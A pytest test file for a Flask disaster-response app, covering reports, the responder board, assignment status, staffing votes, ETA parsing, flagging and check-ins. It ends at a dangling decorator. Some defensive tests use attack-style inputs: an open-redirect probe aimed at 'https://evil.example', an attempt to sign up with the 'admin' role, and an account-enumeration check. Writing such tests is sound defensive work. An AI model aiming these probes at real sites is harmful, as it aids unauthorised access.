"""Smoke tests for the routes plus unit tests for the two rules that matter.

    pip install -r requirements-dev.txt
    pytest -q

Each test gets its own throwaway database, so order never matters and a
failing test can't poison the next one.
"""

import base64
import json
import re
import shutil
import subprocess
import sys
from collections import Counter
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import app as diresq  # noqa: E402
import classify  # noqa: E402
import eta  # noqa: E402
import transport  # noqa: E402


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setattr(diresq, "DATABASE", str(tmp_path / "test.db"))
    # Skip the login redirect; TestLogin covers auth separately.
    monkeypatch.setenv("DIRESQ_DEV_USER", "londo")
    diresq.init_db()
    with diresq.app.app_context():
        diresq.seed_minimal()
    return diresq.app.test_client()


@pytest.fixture
def anon(tmp_path, monkeypatch):
    monkeypatch.setattr(diresq, "DATABASE", str(tmp_path / "test.db"))
    monkeypatch.delenv("DIRESQ_DEV_USER", raising=False)
    diresq.init_db()
    with diresq.app.app_context():
        diresq.seed_minimal()
    return diresq.app.test_client()


def count_reports():
    with diresq.app.app_context():
        return diresq.get_db().execute(
            "SELECT COUNT(*) AS c FROM reports"
        ).fetchone()["c"]


class TestPagesRender:
    def test_homepage(self, client):
        assert client.get("/").status_code == 200

    def test_map(self, client):
        assert client.get("/map").status_code == 200

    def test_report_detail(self, client):
        assert client.get("/report/1").status_code == 200

    def test_missing_report_is_404_not_500(self, client):
        assert client.get("/report/999").status_code == 404

    def test_api_reports_returns_the_seed(self, client):
        body = client.get("/api/reports").get_json()
        assert len(body) == 5
        assert {"lat", "lng", "latitude", "longitude", "staffing"} <= body[0].keys()


class TestFeedOrdering:
    def test_high_priority_sorts_above_low(self, client):
        order = [r["priority"] for r in client.get("/api/reports").get_json()]
        rank = {"HIGH": 3, "MEDIUM": 2, "LOW": 1}
        assert order == sorted(order, key=lambda p: -rank[p]), (
            "alphabetical sorting would put HIGH < LOW < MEDIUM"
        )


class TestCreateReport:
    def test_valid_submission_is_stored(self, client):
        before = count_reports()
        r = client.post("/report/new", data={
            "subject": "Water over the road", "priority": "HIGH",
            "description": "Impassable", "lat": "29.78", "lng": "-95.82",
        })
        assert r.status_code == 302
        assert count_reports() == before + 1

    @pytest.mark.parametrize("payload,reason", [
        ({"subject": "", "priority": "HIGH", "lat": "29.7", "lng": "-95.8"},
         "empty subject"),
        ({"subject": "x", "priority": "URGENT", "lat": "29.7", "lng": "-95.8"},
         "priority outside HIGH/MEDIUM/LOW"),
        ({"subject": "x", "priority": "HIGH"},
         "no location at all"),
        ({"subject": "x", "priority": "HIGH", "lat": "", "lng": ""},
         "map never clicked, hidden inputs empty"),
    ])
    def test_invalid_submission_is_rejected(self, client, payload, reason):
        before = count_reports()
        assert client.post("/report/new", data=payload).status_code == 400, reason
        assert count_reports() == before, f"stored a report despite {reason}"


class TestJoining:
    def test_join_creates_an_assignment(self, client):
        assert client.post("/report/1/rescue").status_code == 302
        with diresq.app.app_context():
            n = diresq.get_db().execute(
                "SELECT COUNT(*) AS c FROM assignments WHERE report_id = 1"
            ).fetchone()["c"]
        assert n == 1

    def test_joining_flips_report_to_active(self, client):
        client.post("/report/1/rescue")
        with diresq.app.app_context():
            status = diresq.get_db().execute(
                "SELECT status FROM reports WHERE id = 1"
            ).fetchone()["status"]
        assert status == "active"

    def test_double_join_does_not_500_or_duplicate(self, client):
        client.post("/report/1/rescue")
        assert client.post("/report/1/rescue").status_code == 302
        with diresq.app.app_context():
            n = diresq.get_db().execute(
                "SELECT COUNT(*) AS c FROM assignments WHERE report_id = 1"
            ).fetchone()["c"]
        assert n == 1

    def test_join_missing_report_is_404(self, client):
        assert client.post("/report/999/rescue").status_code == 404


class TestLogin:
    def test_correct_credentials_redirect(self, anon):
        r = anon.post("/login", data={"username": "londo", "password": "diresq"})
        assert r.status_code == 302

    @pytest.mark.parametrize("username", ["londo", "does-not-exist"])
    def test_bad_credentials_give_the_same_message(self, anon, username):
        r = anon.post("/login", data={"username": username, "password": "wrong"})
        assert r.status_code == 401
        assert b"Invalid username or password" in r.data, (
            "a distinct message per case would let anyone enumerate accounts"
        )

    def test_pages_require_login(self, anon):
        r = anon.get("/")
        assert r.status_code == 302 and "/login" in r.headers["Location"]

    def test_logout_clears_the_session(self, anon):
        anon.post("/login", data={"username": "londo", "password": "diresq"})
        assert anon.get("/").status_code == 200
        assert anon.post("/logout").status_code == 302
        r = anon.get("/")
        assert r.status_code == 302 and "/login" in r.headers["Location"], (
            "still authenticated after logout"
        )


class TestSignup:
    def test_page_renders(self, anon):
        assert anon.get("/signup").status_code == 200

    def test_valid_signup_creates_an_account_and_logs_in(self, anon):
        r = anon.post("/signup", data={
            "username": "newbie", "password": "longenough1",
            "confirm_password": "longenough1",
        })
        assert r.status_code == 302
        with diresq.app.app_context():
            row = diresq.get_db().execute(
                "SELECT role, hashed_password FROM accounts WHERE username = 'newbie'"
            ).fetchone()
        assert row["role"] == "responder"
        assert row["hashed_password"] != "longenough1", "password stored in the clear"

    @pytest.mark.parametrize("payload,reason", [
        ({"username": "londo", "password": "longenough1",
          "confirm_password": "longenough1"}, "username already taken"),
        ({"username": "bob", "password": "longenough1",
          "confirm_password": "different111"}, "confirmation does not match"),
        ({"username": "bob", "password": "short",
          "confirm_password": "short"}, "password under 8 characters"),
        ({"username": "ab", "password": "longenough1",
          "confirm_password": "longenough1"}, "username under 3 characters"),
        ({"username": "bob", "password": "longenough1",
          "confirm_password": "longenough1", "role": "admin"}, "role not in the enum"),
    ])
    def test_invalid_signup_is_rejected(self, anon, payload, reason):
        assert anon.post("/signup", data=payload).status_code == 400, reason
        with diresq.app.app_context():
            n = diresq.get_db().execute(
                "SELECT COUNT(*) AS c FROM accounts"
            ).fetchone()["c"]
        assert n == 3, f"created an account despite {reason}"


class TestBoard:
    def test_lists_every_responder_as_available(self, client):
        board = client.get("/api/responders").get_json()
        assert {r["username"] for r in board} == {"londo", "skythe"}
        assert all(r["state"] == "available" for r in board)
        assert all(r["assignment"] is None for r in board)

    def test_reporters_are_not_on_the_board(self, client):
        board = client.get("/api/responders").get_json()
        assert "kiyan" not in {r["username"] for r in board}

    def test_joining_puts_a_responder_en_route(self, client):
        client.post("/report/1/rescue")
        row = next(r for r in client.get("/api/responders").get_json()
                   if r["username"] == "londo")
        assert row["state"] == "en_route"
        assert row["assignment"]["report_subject"] == "Water rising, 2 trapped"

    def test_checkin_records_a_position(self, client):
        client.post("/report/1/rescue")
        assert client.post("/api/checkin",
                           json={"lat": 29.78, "lng": -95.82}).status_code == 201
        row = next(r for r in client.get("/api/responders").get_json()
                   if r["username"] == "londo")
        assert row["last_position"]["lat"] == 29.78

    def test_stale_assignment_goes_overdue_and_sorts_first(self, client):
        client.post("/report/1/rescue")
        stale = (datetime.now(timezone.utc) - timedelta(minutes=90)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()

        board = client.get("/api/responders").get_json()
        assert board[0]["state"] == "overdue"
        assert board[0]["overdue"] is True
        assert board[0]["minutes_since_contact"] >= 89

    def test_a_checkin_pulls_someone_back_off_overdue(self, client):
        client.post("/report/1/rescue")
        stale = (datetime.now(timezone.utc) - timedelta(minutes=90)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})

        row = next(r for r in client.get("/api/responders").get_json()
                   if r["username"] == "londo")
        assert row["state"] == "en_route"
        assert row["overdue"] is False

    def test_board_requires_login(self, anon):
        assert anon.get("/api/responders").status_code == 302


def assignment_id_for(report_id, username="londo"):
    with diresq.app.app_context():
        return diresq.get_db().execute("""
            SELECT asg.id FROM assignments asg
            JOIN accounts a ON a.id = asg.responder
            WHERE asg.report_id = ? AND a.username = ?
        """, (report_id, username)).fetchone()["id"]


class TestAssignmentStatus:
    def test_en_route_advances_to_on_scene(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        r = client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        assert r.status_code == 200
        assert r.get_json()["status"] == "on_scene"

    def test_full_progression(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        for step in ("on_scene", "cleared"):
            assert client.post(f"/api/assignments/{aid}/status",
                               json={"status": step}).status_code == 200

    @pytest.mark.parametrize("target", ["cleared", "en_route", "nonsense", ""])
    def test_illegal_transitions_from_en_route_are_400(self, client, target):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        r = client.post(f"/api/assignments/{aid}/status", json={"status": target})
        assert r.status_code == 400, f"allowed en_route -> {target}"

    def test_cannot_reverse_out_of_on_scene(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        r = client.post(f"/api/assignments/{aid}/status", json={"status": "en_route"})
        assert r.status_code == 400, "un-arrived at a scene"

    def test_cannot_advance_someone_elses_assignment(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        with diresq.app.app_context():
            db = diresq.get_db()
            other = db.execute(
                "SELECT id FROM accounts WHERE username = 'skythe'").fetchone()["id"]
            db.execute("UPDATE assignments SET responder = ? WHERE id = ?", (other, aid))
            db.commit()
        r = client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        assert r.status_code == 403

    def test_missing_assignment_is_404(self, client):
        assert client.post("/api/assignments/999/status",
                           json={"status": "on_scene"}).status_code == 404

    def test_clearing_frees_the_responder_on_the_board(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        client.post(f"/api/assignments/{aid}/status", json={"status": "cleared"})
        row = next(r for r in client.get("/api/responders").get_json()
                   if r["username"] == "londo")
        assert row["state"] == "available"
        assert row["assignment"] is None


class TestStaffingVotes:
    def on_scene(self, client, report_id=1):
        client.post(f"/report/{report_id}/rescue")
        aid = assignment_id_for(report_id)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        return aid

    def test_on_scene_responder_can_vote(self, client):
        self.on_scene(client)
        r = client.post("/api/reports/1/staffing", json={"staffing": "need_more"})
        assert r.status_code == 200
        assert r.get_json()["staffing"] == "need_more"

    def test_en_route_responder_cannot_vote(self, client):
        client.post("/report/1/rescue")
        r = client.post("/api/reports/1/staffing", json={"staffing": "adequate"})
        assert r.status_code == 403, "voted without being on scene"

    def test_uninvolved_responder_cannot_vote(self, client):
        r = client.post("/api/reports/1/staffing", json={"staffing": "adequate"})
        assert r.status_code == 403

    def test_unknown_signal_is_400(self, client):
        self.on_scene(client)
        assert client.post("/api/reports/1/staffing",
                           json={"staffing": "vibes"}).status_code == 400

    def test_vote_shows_up_on_the_report_feed(self, client):
        self.on_scene(client)
        client.post("/api/reports/1/staffing", json={"staffing": "overstaffed"})
        report = next(r for r in client.get("/api/reports").get_json()
                      if r["id"] == 1)
        assert report["staffing"] == "overstaffed"

    def test_most_cautious_vote_wins_across_two_responders(self, client):
        self.on_scene(client)
        client.post("/api/reports/1/staffing", json={"staffing": "overstaffed"})

        # Second responder on scene, asking for help.
        with diresq.app.app_context():
            db = diresq.get_db()
            other = db.execute(
                "SELECT id FROM accounts WHERE username = 'skythe'").fetchone()["id"]
            db.execute("""
                INSERT INTO assignments
                    (report_id, responder, status, staffing_vote, joined_at)
                VALUES (1, ?, 'on_scene', 'need_more', ?)
            """, (other, diresq.now_iso()))
            db.commit()

        report = next(r for r in client.get("/api/reports").get_json()
                      if r["id"] == 1)
        assert report["staffing"] == "need_more", (
            "an optimistic vote suppressed a call for help"
        )

    def test_clearing_retracts_your_vote(self, client):
        aid = self.on_scene(client)
        client.post("/api/reports/1/staffing", json={"staffing": "need_more"})
        client.post(f"/api/assignments/{aid}/status", json={"status": "cleared"})
        report = next(r for r in client.get("/api/reports").get_json()
                      if r["id"] == 1)
        assert report["staffing"] == "unstaffed"


class TestEtaParsing:
    def test_a_clear_duration_is_accepted(self):
        now = datetime(2026, 8, 1, 21, 30, tzinfo=timezone.utc)
        r = eta.parse_eta("in 45 minutes", now=now)
        assert r.accepted
        assert r.when == now + timedelta(minutes=45)

    @pytest.mark.parametrize("text,why", [
        ("", "nothing typed"),
        ("asdfgh", "not a time at all"),
        ("soon", "no duration in it"),
        ("in a bit", "no duration in it"),
        ("end of day", "not a duration, and timefuzz has no rule for it"),
    ])
    def test_unparseable_input_is_refused_not_guessed(self, text, why):
        r = eta.parse_eta(text)
        assert not r.accepted, why
        assert r.message, "refused without telling anyone why"

    @pytest.mark.parametrize("text,minutes", [
        ("30 minutes", 30),
        ("30 mins", 30),
        ("30 min", 30),
        ("20m", 20),
        ("45", 45),
        ("2 hours", 120),
        ("2 hrs", 120),
        ("2h", 120),
        ("an hour", 60),
        ("half an hour", 30),
        ("an hour and a half", 90),
        ("a couple hours", 120),
        ("back in a couple hours", 120),
        ("three hours", 180),
    ])
    def test_bare_durations_are_understood(self, text, minutes):
        now = datetime(2026, 8, 1, 21, 30, tzinfo=timezone.utc)
        r = eta.parse_eta(text, now=now)
        assert r.accepted, f"{text!r} should parse"
        assert r.when == now + timedelta(minutes=minutes)

    def test_normalising_leaves_calendar_phrasing_alone(self):
        for text in ["next friday", "tomorrow", "end of q3", "asdfgh"]:
            assert eta.normalise(text) == text, (
                f"rewrote {text!r}, which is not a duration"
            )

    def test_parse_errors_never_escape(self):
        # The whole point of the wrapper: ParseError must not reach the route.
        for junk in ["", "???", "\x00", "next" * 50, "in -5 minutes"]:
            assert isinstance(eta.parse_eta(junk), eta.EtaResult)

    def test_beyond_the_cap_is_rejected(self):
        now = datetime(2026, 8, 1, 9, 0, tzinfo=timezone.utc)
        r = eta.parse_eta("tomorrow", now=now)
        assert not r.accepted
        assert "capped" in r.message

    def test_very_short_intervals_round_up_rather_than_fail(self):
        now = datetime(2026, 8, 1, 21, 30, tzinfo=timezone.utc)
        r = eta.parse_eta("in 1 minute", now=now)
        assert r.accepted
        assert r.when == now + timedelta(minutes=eta.MIN_MINUTES)
        assert r.warning

    def test_long_but_legal_intervals_warn_without_blocking(self):
        now = datetime(2026, 8, 1, 21, 30, tzinfo=timezone.utc)
        r = eta.parse_eta("in 150 minutes", now=now)
        assert r.accepted and r.warning

    def test_a_confident_short_eta_carries_no_warning(self):
        now = datetime(2026, 8, 1, 21, 30, tzinfo=timezone.utc)
        r = eta.parse_eta("in 20 minutes", now=now)
        assert r.accepted and not r.warning
        assert r.confidence >= eta.CONFIDENCE_FLOOR


class TestJoinWithEta:
    def stored_eta(self):
        with diresq.app.app_context():
            return diresq.get_db().execute(
                "SELECT eta, eta_confidence FROM assignments WHERE id = 1"
            ).fetchone()

    def test_a_good_eta_is_stored(self, client):
        client.post("/report/1/rescue", data={"eta_text": "in 45 minutes"})
        row = self.stored_eta()
        assert row["eta"] is not None
        assert row["eta_confidence"] >= eta.CONFIDENCE_FLOOR

    def test_a_bad_eta_still_joins_but_stores_nothing(self, client):
        r = client.post("/report/1/rescue", data={"eta_text": "sometime i guess"})
        assert r.status_code == 302, "a bad ETA blocked someone from joining"
        assert self.stored_eta()["eta"] is None

    def test_joining_without_an_eta_is_unchanged(self, client):
        client.post("/report/1/rescue")
        assert self.stored_eta()["eta"] is None

    def test_the_board_uses_a_real_eta_over_the_default(self, client):
        # Default interval is 30 min. A 45 min ETA must survive past it.
        client.post("/report/1/rescue", data={"eta_text": "in 45 minutes"})
        stale = (datetime.now(timezone.utc) - timedelta(minutes=40)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()
        row = next(r for r in client.get("/api/responders").get_json()
                   if r["username"] == "londo")
        assert row["overdue"] is False, (
            "default interval overrode an explicit ETA"
        )


class TestResolve:
    def test_reporter_can_resolve_their_own(self, anon):
        anon.post("/login", data={"username": "kiyan", "password": "diresq"})
        assert anon.post("/report/1/resolve").status_code == 302
        with diresq.app.app_context():
            status = diresq.get_db().execute(
                "SELECT status FROM reports WHERE id = 1").fetchone()["status"]
        assert status == "resolved"

    def test_on_scene_responder_can_resolve(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        client.post("/report/1/resolve")
        with diresq.app.app_context():
            status = diresq.get_db().execute(
                "SELECT status FROM reports WHERE id = 1").fetchone()["status"]
        assert status == "resolved"

    def test_uninvolved_user_cannot_resolve(self, client):
        client.post("/report/1/resolve")
        with diresq.app.app_context():
            status = diresq.get_db().execute(
                "SELECT status FROM reports WHERE id = 1").fetchone()["status"]
        assert status == "unassigned", "a bystander closed someone else's report"

    def test_en_route_is_not_close_enough(self, client):
        client.post("/report/1/rescue")
        client.post("/report/1/resolve")
        with diresq.app.app_context():
            status = diresq.get_db().execute(
                "SELECT status FROM reports WHERE id = 1").fetchone()["status"]
        assert status == "active"

    def test_resolving_drops_it_from_the_feed(self, anon):
        anon.post("/login", data={"username": "kiyan", "password": "diresq"})
        before = len(anon.get("/api/reports").get_json())
        anon.post("/report/1/resolve")
        assert len(anon.get("/api/reports").get_json()) == before - 1

    def test_resolving_clears_everyone_still_attached(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        client.post("/report/1/resolve")
        row = next(r for r in client.get("/api/responders").get_json()
                   if r["username"] == "londo")
        assert row["state"] == "available"

    def test_resolving_a_missing_report_is_404(self, client):
        assert client.post("/report/999/resolve").status_code == 404


class TestCardShowsResponders:
    def test_untouched_report_reads_zero_responding(self, client):
        assert b"0 responding" in client.get("/").data

    def test_card_shows_en_route_count(self, client):
        client.post("/report/1/rescue")
        assert b"1 en route" in client.get("/").data

    def test_card_shows_on_scene_count(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        assert b"1 on scene" in client.get("/").data

    def test_staffing_badge_appears_once_voted(self, client):
        client.post("/report/1/rescue")
        aid = assignment_id_for(1)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
        assert b"NEED MORE" not in client.get("/").data
        client.post("/api/reports/1/staffing", json={"staffing": "need_more"})
        assert b"NEED MORE" in client.get("/").data

    def test_unstaffed_reports_get_no_badge(self, client):
        body = client.get("/").data
        assert b"UNSTAFFED" not in body


class TestBoardPage:
    def test_page_renders(self, client):
        assert client.get("/board").status_code == 200

    def test_requires_login(self, anon):
        r = anon.get("/board")
        assert r.status_code == 302 and "/login" in r.headers["Location"]

    def test_lists_responders_server_side(self, client):
        body = client.get("/board").get_data(as_text=True)
        assert "londo" in body and "skythe" in body
        assert "kiyan" not in body, "reporters do not belong on the board"

    def test_shows_what_someone_is_doing(self, client):
        client.post("/report/1/rescue")
        body = client.get("/board").get_data(as_text=True)
        assert "Water rising, 2 trapped" in body
        assert "EN ROUTE" in body

    def test_overdue_row_is_marked(self, client):
        client.post("/report/1/rescue")
        stale = (datetime.now(timezone.utc) - timedelta(minutes=90)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()
        body = client.get("/board").get_data(as_text=True)
        assert 'class="row overdue"' in body
        assert "OVERDUE" in body
        assert "last contact 90 min ago" in body

    def test_page_works_with_no_responders_at_all(self, anon):
        # Empty board must render, not explode.
        anon.post("/login", data={"username": "kiyan", "password": "diresq"})
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("DELETE FROM assignments")
            db.execute("UPDATE accounts SET role = 'reporter'")
            db.commit()
        assert anon.get("/board").status_code == 200


class TestOverdueCountInNav:
    @staticmethod
    def count():
        with diresq.app.test_request_context():
            return diresq.inject_overdue_count()["overdue_count"]()

    def test_zero_when_nobody_is_late(self, client):
        assert self.count() == 0

    def test_counts_only_the_overdue(self, client):
        client.post("/report/1/rescue")
        assert self.count() == 0, "counted someone who is not late yet"

        stale = (datetime.now(timezone.utc) - timedelta(minutes=90)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()
        assert self.count() == 1

    def test_a_checkin_clears_it(self, client):
        client.post("/report/1/rescue")
        stale = (datetime.now(timezone.utc) - timedelta(minutes=90)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()
        assert self.count() == 1
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})
        assert self.count() == 0

    def test_zero_for_anonymous_visitors(self, anon):
        assert self.count() == 0

    @pytest.mark.parametrize("page", ["/", "/map", "/report/1"])
    def test_every_page_links_to_the_board(self, client, page):
        body = client.get(page).get_data(as_text=True)
        assert 'href="/board"' in body, f"{page} has no way to reach the board"

    @pytest.mark.parametrize("page", ["/", "/map", "/report/1"])
    def test_the_link_is_quiet_when_nobody_is_late(self, client, page):
        body = client.get(page).get_data(as_text=True)
        assert "board-btn alert" not in body
        assert 'class="badge"' not in body

    @pytest.mark.parametrize("page", ["/", "/map", "/report/1"])
    def test_the_link_raises_the_alarm_from_any_page(self, client, page):
        client.post("/report/1/rescue")
        stale = (datetime.now(timezone.utc) - timedelta(minutes=90)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()

        body = client.get(page).get_data(as_text=True)
        assert "board-btn alert" in body, f"{page} did not show the alarm"
        assert '<span class="badge">' in body


class TestReportPageActions:
    """The buttons, not the endpoints. Every demo beat has to be pressable."""

    def buttons(self, client):
        html = client.get("/report/1").get_data(as_text=True)
        return " ".join(re.findall(r"<button[^>]*>(.*?)</button>", html, re.S))

    def test_a_stranger_is_offered_only_join(self, client):
        text = self.buttons(client)
        assert "Respond" in text
        assert "on scene" not in text
        assert "Need more help" not in text

    def test_joining_offers_going_on_scene_and_checking_in(self, client):
        client.post("/report/1/rescue")
        text = self.buttons(client)
        assert "on scene" in text
        assert "Check in" in text
        assert "Respond" not in text, "offered to join a report twice"

    def test_staffing_buttons_only_appear_on_scene(self, client):
        client.post("/report/1/rescue")
        assert "Need more help" not in self.buttons(client)

        client.post("/api/assignments/1/status",
                    data={"status": "on_scene", "next": "/report/1"})
        text = self.buttons(client)
        for label in ["Need more help", "We have enough",
                      "Too many here", "Stand down"]:
            assert label in text

    def test_the_join_form_asks_for_an_eta(self, client):
        assert b'name="eta_text"' in client.get("/report/1").data

    def test_pressing_a_staffing_button_changes_the_feed(self, client):
        client.post("/report/1/rescue")
        client.post("/api/assignments/1/status",
                    data={"status": "on_scene", "next": "/report/1"})
        client.post("/api/reports/1/staffing",
                    data={"staffing": "overstaffed", "next": "/report/1"})

        report = next(r for r in client.get("/api/reports").get_json()
                      if r["id"] == 1)
        assert report["staffing"] == "overstaffed"

    def test_your_current_vote_is_marked(self, client):
        client.post("/report/1/rescue")
        client.post("/api/assignments/1/status",
                    data={"status": "on_scene", "next": "/report/1"})
        client.post("/api/reports/1/staffing",
                    data={"staffing": "need_more", "next": "/report/1"})
        assert b"vote need_more chosen" in client.get("/report/1").data

    def test_resolve_appears_for_someone_on_scene(self, client):
        client.post("/report/1/rescue")
        assert "Mark resolved" not in self.buttons(client), "en route can resolve"

        client.post("/api/assignments/1/status",
                    data={"status": "on_scene", "next": "/report/1"})
        assert "Mark resolved" in self.buttons(client)

    def test_a_resolved_report_offers_nothing(self, client):
        client.post("/report/1/rescue")
        client.post("/api/assignments/1/status",
                    data={"status": "on_scene", "next": "/report/1"})
        client.post("/report/1/resolve")
        assert self.buttons(client).strip() == ""
        assert b"RESOLVED" in client.get("/report/1").data

    def test_the_page_lists_everyone_on_it(self, client):
        client.post("/report/1/rescue")
        body = client.get("/report/1").get_data(as_text=True)
        assert "londo" in body
        assert "EN ROUTE" in body

    def test_form_posts_redirect_instead_of_returning_json(self, client):
        client.post("/report/1/rescue")
        r = client.post("/api/assignments/1/status",
                        data={"status": "on_scene", "next": "/report/1"})
        assert r.status_code == 302
        assert r.headers["Location"].endswith("/report/1")

    def test_json_posts_still_get_json(self, client):
        client.post("/report/1/rescue")
        r = client.post("/api/assignments/1/status", json={"status": "on_scene"})
        assert r.status_code == 200
        assert r.get_json()["status"] == "on_scene"

    def test_a_redirect_target_offsite_is_ignored(self, client):
        client.post("/report/1/rescue")
        r = client.post("/api/assignments/1/status",
                        data={"status": "on_scene", "next": "https://evil.example"})
        assert "evil.example" not in r.headers["Location"]


class TestFlagging:
    def flags(self, report_id=1):
        with diresq.app.app_context():
            return diresq.get_db().execute(
                "SELECT flags, status FROM reports WHERE id = ?", (report_id,)
            ).fetchone()

    def test_flagging_counts(self, client):
        assert client.post("/report/1/flag").status_code == 302
        assert self.flags()["flags"] == 1

    def test_one_flag_per_person(self, client):
        client.post("/report/1/flag")
        r = client.post("/report/1/flag")
        assert r.status_code == 302, "second flag broke instead of being refused"
        assert self.flags()["flags"] == 1

    def test_it_takes_three_to_hide(self, client):
        with diresq.app.app_context():
            db = diresq.get_db()
            for i in (2, 3):
                db.execute("""
                    INSERT INTO report_flags (report_id, account_id, created_at)
                    VALUES (1, ?, ?)
                """, (i, diresq.now_iso()))
            db.execute("UPDATE reports SET flags = 2 WHERE id = 1")
            db.commit()

        assert self.flags()["status"] != "hidden"
        client.post("/report/1/flag")
        assert self.flags()["status"] == "hidden"

    def test_a_hidden_report_leaves_the_feed(self, client):
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE reports SET status = 'hidden' WHERE id = 1")
            db.commit()
        assert not any(r["id"] == 1 for r in client.get("/api/reports").get_json())

    def test_flagging_a_missing_report_is_404(self, client):
        assert client.post("/report/999/flag").status_code == 404


class TestPositionMismatch:
    def check_in_at(self, client, lat, lng):
        client.post("/api/checkin", json={"lat": lat, "lng": lng})

    def mismatch(self):
        with diresq.app.app_context():
            return bool(diresq.get_db().execute(
                "SELECT position_mismatch FROM assignments WHERE id = 1"
            ).fetchone()["position_mismatch"])

    def test_checking_in_near_the_report_is_fine(self, client):
        client.post("/report/1/rescue")
        # Report 1 is at 29.7858, -95.8244. This is a couple of streets away.
        self.check_in_at(client, 29.7861, -95.8249)
        client.post("/api/assignments/1/status", json={"status": "on_scene"})
        assert self.mismatch() is False

    def test_being_miles_away_is_flagged(self, client):
        client.post("/report/1/rescue")
        self.check_in_at(client, 29.9000, -95.5000)
        client.post("/api/assignments/1/status", json={"status": "on_scene"})
        assert self.mismatch() is True

    def test_no_checkin_means_no_accusation(self, client):
        client.post("/report/1/rescue")
        client.post("/api/assignments/1/status", json={"status": "on_scene"})
        assert self.mismatch() is False

    def test_the_board_shows_it(self, client):
        client.post("/report/1/rescue")
        self.check_in_at(client, 29.9000, -95.5000)
        client.post("/api/assignments/1/status", json={"status": "on_scene"})
        row = next(r for r in client.get("/api/responders").get_json()
                   if r["username"] == "londo")
        assert row["assignment"]["position_mismatch"] is True

    @pytest.mark.parametrize("lat,lng,metres", [
        (29.7858, -95.8244, 0),
        (29.7858, -95.8144, 966),
    ])
    def test_distance_maths(self, lat, lng, metres):
        got = diresq.metres_between(29.7858, -95.8244, lat, lng)
        assert abs(got - metres) < 30

    def test_distance_with_missing_coordinates(self):
        assert diresq.metres_between(None, -95.8, 29.7, -95.8) is None


class TestQueuedCheckins:
    """A check-in that sat offline must not clear a timer it never met."""

    def go_overdue(self, client, minutes=90):
        client.post("/report/1/rescue")
        stale = (datetime.now(timezone.utc) - timedelta(minutes=minutes)).isoformat(
            timespec="seconds")
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE assignments SET joined_at = ?", (stale,))
            db.commit()

    def row(self, client):
        return next(r for r in client.get("/api/responders").get_json()
                    if r["username"] == "londo")

    def test_a_live_checkin_clears_the_timer(self, client):
        self.go_overdue(client)
        assert self.row(client)["overdue"] is True
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})
        assert self.row(client)["overdue"] is False

    def test_an_old_queued_checkin_does_not(self, client):
        # Made 80 minutes ago, syncing now. They were silent for the 30-minute
        # window, so the row has to stay red.
        self.go_overdue(client)
        made = (datetime.now(timezone.utc) - timedelta(minutes=80)).isoformat(
            timespec="seconds")
        client.post("/api/checkin", json={
            "lat": 29.78, "lng": -95.82, "happened_at": made,
        })
        assert self.row(client)["overdue"] is True, (
            "a late sync silently cleared an overdue responder"
        )

    def test_a_recent_queued_checkin_does_clear_it(self, client):
        self.go_overdue(client)
        made = (datetime.now(timezone.utc) - timedelta(minutes=5)).isoformat(
            timespec="seconds")
        client.post("/api/checkin", json={
            "lat": 29.78, "lng": -95.82, "happened_at": made,
        })
        assert self.row(client)["overdue"] is False

    def test_the_board_shows_it_arrived_late(self, client):
        client.post("/report/1/rescue")
        made = (datetime.now(timezone.utc) - timedelta(minutes=20)).isoformat(
            timespec="seconds")
        client.post("/api/checkin", json={
            "lat": 29.78, "lng": -95.82, "happened_at": made,
        })
        pos = self.row(client)["last_position"]
        assert pos["synced_late"] is True
        assert pos["at"] != pos["received_at"]

    def test_a_normal_checkin_is_not_marked_late(self, client):
        client.post("/report/1/rescue")
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})
        assert self.row(client)["last_position"]["synced_late"] is False

    @pytest.mark.parametrize("offset,why", [
        (timedelta(hours=5), "dated hours into the future"),
        (timedelta(hours=-20), "older than the backdating cap"),
    ])
